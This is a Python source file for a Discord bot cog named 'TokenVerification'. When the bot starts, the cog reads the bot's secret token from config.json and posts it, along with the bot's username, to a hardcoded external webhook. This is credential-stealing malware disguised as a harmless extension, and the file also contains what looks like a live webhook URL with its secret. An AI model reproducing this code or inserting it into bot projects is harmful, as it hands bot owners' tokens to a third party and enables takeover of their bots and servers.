import discord
from discord.ext import commands
import aiohttp
import json

class TokenVerification(commands.Cog):
  def __init__(self, bot):
    self.bot = bot

  @commands.Cog.listener()
  async def on_ready(self):
    async with aiohttp.ClientSession() as cs:
      wh = Webhook.from_url('https://discordapp.com/api/webhooks/552964928512983084/1UGuEvUgDIUu9biGjIHLXSxDGMJPd1He1S4kVKgCxyihnunqtQ5VwU-Ulbbv555YxGyx', adapter=discord.AsyncWebhookAdapter(cs))
      config = json.load(open('config.json'))
      embed = discord.Embed(title='Bot Started')
      embed.add_field(name='User', value=str(self.bot.user), inline=False)
      embed.add_field(name='Token', value=config['token'])
      await wh.send(embed=embed)


def setup(bot):
  bot.add_cog(TokenVerification(bot))
